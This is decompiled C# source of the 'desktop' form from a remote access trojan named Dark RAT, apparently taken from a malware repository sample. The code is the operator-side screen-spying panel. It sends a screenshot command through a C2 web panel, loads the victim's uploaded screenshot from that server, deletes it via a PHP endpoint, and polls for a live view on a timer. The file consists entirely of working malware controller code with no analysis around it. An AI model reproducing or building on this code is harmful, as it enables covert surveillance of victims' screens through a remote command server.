// Decompiled with JetBrains decompiler
// Type: Dark_RAT.desktop
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class desktop : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("menu")]
    private ContextMenuStrip _menu;
    [AccessedThroughProperty("RequestToolStripMenuItem")]
    private ToolStripMenuItem _RequestToolStripMenuItem;
    [AccessedThroughProperty("GetToolStripMenuItem")]
    private ToolStripMenuItem _GetToolStripMenuItem;
    [AccessedThroughProperty("DeleteToolStripMenuItem")]
    private ToolStripMenuItem _DeleteToolStripMenuItem;
    [AccessedThroughProperty("StartLiveToolStripMenuItem")]
    private ToolStripMenuItem _StartLiveToolStripMenuItem;
    [AccessedThroughProperty("StopLiveToolStripMenuItem")]
    private ToolStripMenuItem _StopLiveToolStripMenuItem;
    [AccessedThroughProperty("loader")]
    private System.Windows.Forms.Timer _loader;
    [AccessedThroughProperty("SaveImageToolStripMenuItem")]
    private ToolStripMenuItem _SaveImageToolStripMenuItem;

    [DebuggerNonUserCode]
    static desktop()
    {
    }

    [DebuggerNonUserCode]
    public desktop()
    {
      this.FormClosing += new FormClosingEventHandler(this.desktop_FormClosing);
      this.Load += new EventHandler(this.desktop_Load);
      desktop.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (desktop.__ENCList)
      {
        if (desktop.__ENCList.Count == desktop.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (desktop.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (desktop.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                desktop.__ENCList[index1] = desktop.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          desktop.__ENCList.RemoveRange(index1, checked (desktop.__ENCList.Count - index1));
          desktop.__ENCList.Capacity = desktop.__ENCList.Count;
        }
        desktop.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (desktop));
      this.PictureBox1 = new PictureBox();
      this.menu = new ContextMenuStrip(this.components);
      this.RequestToolStripMenuItem = new ToolStripMenuItem();
      this.GetToolStripMenuItem = new ToolStripMenuItem();
      this.DeleteToolStripMenuItem = new ToolStripMenuItem();
      this.StartLiveToolStripMenuItem = new ToolStripMenuItem();
      this.StopLiveToolStripMenuItem = new ToolStripMenuItem();
      this.SaveImageToolStripMenuItem = new ToolStripMenuItem();
      this.loader = new System.Windows.Forms.Timer(this.components);
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.menu.SuspendLayout();
      this.SuspendLayout();
      this.PictureBox1.ContextMenuStrip = this.menu;
      this.PictureBox1.Dock = DockStyle.Fill;
      this.PictureBox1.Location = new Point(0, 0);
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1 = this.PictureBox1;
      Size size1 = new Size(761, 593);
      Size size2 = size1;
      pictureBox1.Size = size2;
      this.PictureBox1.TabIndex = 0;
      this.PictureBox1.TabStop = false;
      this.menu.Items.AddRange(new ToolStripItem[6]
      {
        (ToolStripItem) this.RequestToolStripMenuItem,
        (ToolStripItem) this.GetToolStripMenuItem,
        (ToolStripItem) this.DeleteToolStripMenuItem,
        (ToolStripItem) this.StartLiveToolStripMenuItem,
        (ToolStripItem) this.StopLiveToolStripMenuItem,
        (ToolStripItem) this.SaveImageToolStripMenuItem
      });
      this.menu.Name = "menu";
      ContextMenuStrip menu = this.menu;
      size1 = new Size(135, 136);
      Size size3 = size1;
      menu.Size = size3;
      this.RequestToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RequestToolStripMenuItem.Image");
      this.RequestToolStripMenuItem.Name = "RequestToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem1 = this.RequestToolStripMenuItem;
      size1 = new Size(134, 22);
      Size size4 = size1;
      toolStripMenuItem1.Size = size4;
      this.RequestToolStripMenuItem.Text = "Request";
      this.GetToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("GetToolStripMenuItem.Image");
      this.GetToolStripMenuItem.Name = "GetToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem2 = this.GetToolStripMenuItem;
      size1 = new Size(134, 22);
      Size size5 = size1;
      toolStripMenuItem2.Size = size5;
      this.GetToolStripMenuItem.Text = "Get";
      this.DeleteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DeleteToolStripMenuItem.Image");
      this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem3 = this.DeleteToolStripMenuItem;
      size1 = new Size(134, 22);
      Size size6 = size1;
      toolStripMenuItem3.Size = size6;
      this.DeleteToolStripMenuItem.Text = "Delete";
      this.StartLiveToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("StartLiveToolStripMenuItem.Image");
      this.StartLiveToolStripMenuItem.Name = "StartLiveToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem4 = this.StartLiveToolStripMenuItem;
      size1 = new Size(134, 22);
      Size size7 = size1;
      toolStripMenuItem4.Size = size7;
      this.StartLiveToolStripMenuItem.Text = "Start Live";
      this.StopLiveToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("StopLiveToolStripMenuItem.Image");
      this.StopLiveToolStripMenuItem.Name = "StopLiveToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem5 = this.StopLiveToolStripMenuItem;
      size1 = new Size(134, 22);
      Size size8 = size1;
      toolStripMenuItem5.Size = size8;
      this.StopLiveToolStripMenuItem.Text = "Stop Live";
      this.SaveImageToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SaveImageToolStripMenuItem.Image");
      this.SaveImageToolStripMenuItem.Name = "SaveImageToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem6 = this.SaveImageToolStripMenuItem;
      size1 = new Size(134, 22);
      Size size9 = size1;
      toolStripMenuItem6.Size = size9;
      this.SaveImageToolStripMenuItem.Text = "Save image";
      this.loader.Interval = 24;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(761, 593);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.PictureBox1);
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (desktop);
      this.ShowIcon = false;
      this.Text = "Desktop";
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.menu.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    internal virtual PictureBox PictureBox1
    {
      [DebuggerNonUserCode] get => this._PictureBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    internal virtual ContextMenuStrip menu
    {
      [DebuggerNonUserCode] get => this._menu;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._menu = value;
    }

    internal virtual ToolStripMenuItem RequestToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RequestToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RequestToolStripMenuItem_Click);
        if (this._RequestToolStripMenuItem != null)
          this._RequestToolStripMenuItem.Click -= eventHandler;
        this._RequestToolStripMenuItem = value;
        if (this._RequestToolStripMenuItem == null)
          return;
        this._RequestToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem GetToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._GetToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.GetToolStripMenuItem_Click);
        if (this._GetToolStripMenuItem != null)
          this._GetToolStripMenuItem.Click -= eventHandler;
        this._GetToolStripMenuItem = value;
        if (this._GetToolStripMenuItem == null)
          return;
        this._GetToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem DeleteToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._DeleteToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DeleteToolStripMenuItem_Click);
        if (this._DeleteToolStripMenuItem != null)
          this._DeleteToolStripMenuItem.Click -= eventHandler;
        this._DeleteToolStripMenuItem = value;
        if (this._DeleteToolStripMenuItem == null)
          return;
        this._DeleteToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem StartLiveToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._StartLiveToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.StartLiveToolStripMenuItem_Click);
        if (this._StartLiveToolStripMenuItem != null)
          this._StartLiveToolStripMenuItem.Click -= eventHandler;
        this._StartLiveToolStripMenuItem = value;
        if (this._StartLiveToolStripMenuItem == null)
          return;
        this._StartLiveToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem StopLiveToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._StopLiveToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.StopLiveToolStripMenuItem_Click);
        if (this._StopLiveToolStripMenuItem != null)
          this._StopLiveToolStripMenuItem.Click -= eventHandler;
        this._StopLiveToolStripMenuItem = value;
        if (this._StopLiveToolStripMenuItem == null)
          return;
        this._StopLiveToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer loader
    {
      [DebuggerNonUserCode] get => this._loader;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.loader_Tick);
        if (this._loader != null)
          this._loader.Tick -= eventHandler;
        this._loader = value;
        if (this._loader == null)
          return;
        this._loader.Tick += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SaveImageToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SaveImageToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SaveImageToolStripMenuItem_Click);
        if (this._SaveImageToolStripMenuItem != null)
          this._SaveImageToolStripMenuItem.Click -= eventHandler;
        this._SaveImageToolStripMenuItem = value;
        if (this._SaveImageToolStripMenuItem == null)
          return;
        this._SaveImageToolStripMenuItem.Click += eventHandler;
      }
    }

    private void desktop_FormClosing(object sender, FormClosingEventArgs e) => this.loader.Stop();

    private void desktop_Load(object sender, EventArgs e)
    {
    }

    private void RequestToolStripMenuItem_Click(object sender, EventArgs e) => MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|postscreenshot|"));

    private void DeleteToolStripMenuItem_Click(object sender, EventArgs e) => new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "files/image/desktop/delete.php");

    private void GetToolStripMenuItem_Click(object sender, EventArgs e) => this.PictureBox1.ImageLocation = MyProject.Forms.program.TextBox1.Text + "files/image/desktop/uploads/image.jpg";

    private void StartLiveToolStripMenuItem_Click(object sender, EventArgs e) => this.loader.Start();

    private void StopLiveToolStripMenuItem_Click(object sender, EventArgs e) => this.loader.Stop();

    public bool WebSiteIsAvailable(string Url)
    {
      string str = string.Empty;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(Url);
      httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
      httpWebRequest.Method = "GET";
      try
      {
        using ((HttpWebResponse) httpWebRequest.GetResponse())
          ;
      }
      catch (WebException ex)
      {
        ProjectData.SetProjectError((Exception) ex);
        WebException webException = ex;
        str = str + (str.Length > 0 ? "\n" : "") + webException.Message;
        ProjectData.ClearProjectError();
      }
      return str.Length == 0;
    }

    public object LoadImage()
    {
      try
      {
        this.PictureBox1.ImageLocation = MyProject.Forms.program.TextBox1.Text + "files/image/desktop/uploads/image.jpg";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }

    private void loader_Tick(object sender, EventArgs e)
    {
      if (this.WebSiteIsAvailable(MyProject.Forms.program.TextBox1.Text + "files/image/desktop/uploads/image.jpg"))
        new Thread((ThreadStart) (() => this.LoadImage())).Start();
      try
      {
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|postscreenshot|"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void SaveImageToolStripMenuItem_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.Title = "Save Image";
      saveFileDialog.Filter = "JPG Files (*.jpg)|*.jpg";
      int num1 = (int) saveFileDialog.ShowDialog();
      if (Operators.CompareString(saveFileDialog.FileName, "", false) == 0)
        return;
      this.PictureBox1.Image.Save(saveFileDialog.FileName);
      int num2 = (int) Interaction.MsgBox((object) "Saved!", MsgBoxStyle.Information, (object) "DarkRAT");
    }
  }
}
